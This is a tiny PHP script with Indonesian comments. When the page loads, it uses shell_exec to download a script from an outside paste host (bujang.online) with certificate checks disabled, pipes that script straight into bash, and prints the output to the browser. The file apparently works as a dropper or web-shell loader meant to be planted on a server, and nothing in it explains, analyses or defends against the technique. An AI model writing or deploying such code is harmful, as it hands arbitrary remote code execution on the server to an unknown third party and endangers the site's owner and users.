<?php
// Jalankan command curl ke bash
$output = shell_exec('curl -fsSLk https://bujang.online/raw/nOOE2qe-pF | bash');

// Tampilkan output ke browser
echo "<pre>$output</pre>";
?>